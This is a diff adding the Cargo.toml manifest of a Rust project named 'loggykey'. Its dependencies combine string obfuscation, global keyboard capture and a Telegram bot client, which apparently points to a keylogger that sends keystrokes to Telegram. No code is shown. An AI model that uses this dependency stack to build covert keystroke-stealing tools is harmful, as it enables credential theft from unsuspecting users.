@@ -1,0 +1,18 @@
+[package]
+name = "loggykey"
+version = "0.1.0"
+edition = "2021"
+strip = true
+# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html
+
+[profile.release]
+strip = true
+opt-level = "s"
+lto = true
+panic = "abort"
+
+[dependencies]
+obfstr = "0.4.3"
+rdev = "0.5.3"
+teloxide = "0.12.2"
+tokio = { version = "1.35.0", features = ["rt-multi-thread", "macros"] }
